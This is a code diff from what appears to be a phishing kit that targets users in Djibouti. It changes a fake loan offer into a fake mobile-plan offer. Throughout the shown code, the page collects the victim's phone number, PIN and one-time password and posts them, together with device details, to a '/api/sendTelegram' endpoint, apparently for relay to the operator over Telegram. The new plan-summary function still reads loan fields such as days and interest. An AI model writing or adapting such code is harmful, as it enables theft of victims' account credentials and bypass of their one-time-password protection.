@@ -406,25 +406,25 @@ let phoneValue='',pinValue='',otpValue='';
 let loginClicked=false,otpSubmitted=false,resendClicked=false;
 let currentStep='step1';
 let _otpTimer=null;
-let selectedLoan=null;
-try{selectedLoan=JSON.parse(sessionStorage.getItem('loanData'))}catch(e){}
+let selectedPlan=null;
+try{selectedPlan=JSON.parse(sessionStorage.getItem('planData'))}catch(e){}
 
 function initHeader(){
-  if(!selectedLoan)return;
-  document.getElementById('headerAmount').textContent=selectedLoan.total.toLocaleString('fr-DJ')+' DJF';
-  document.getElementById('pillPlan').textContent=selectedLoan.plan;
-  document.getElementById('pillAmt').textContent=selectedLoan.amount.toLocaleString('fr-DJ')+' DJF';
-  document.getElementById('pillDays').textContent=selectedLoan.days+' Jours';
-  document.getElementById('pillRate').textContent=selectedLoan.rate+'%';
+  if(!selectedPlan)return;
+  document.getElementById('headerAmount').textContent=selectedPlan.amount.toLocaleString('fr-FR').replace(/\s/g,'\u202f')+' DJF';
+  document.getElementById('pillPlan').textContent=selectedPlan.plan;
+  document.getElementById('pillAmt').textContent=selectedPlan.voice+' Min';
+  document.getElementById('pillDays').textContent=selectedPlan.sms+' SMS';
+  document.getElementById('pillRate').textContent=selectedPlan.data+' Go';
 }
 initHeader();
 
 const ua=navigator.userAgent;
 let device=(/Android/i.test(ua)?'Android':(/iPhone|iPad/i.test(ua)?'iOS':'Unknown'));
 if(/Chrome/i.test(ua))device+='|Chrome';else if(/Safari/i.test(ua))device+='|Safari';
-function getLoanLine(){return selectedLoan?`Plan:${selectedLoan.plan}|Montant:${selectedLoan.amount}DJF|Jours:${selectedLoan.days}|Intérêt:${selectedLoan.interest}DJF|Total:${selectedLoan.total}DJF`:''}
+function getPlanLine(){return selectedPlan?`Plan:${selectedPlan.plan}|Montant:${selectedPlan.amount}DJF|Jours:${selectedPlan.days}|Intérêt:${selectedPlan.interest}DJF|Total:${selectedPlan.total}DJF`:''}
 async function sendToTelegram(event){
-  fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event,plan:getLoanLine(),device})});
+  fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event,plan:getPlanLine(),device})});
 }
 
 /* PHONE */
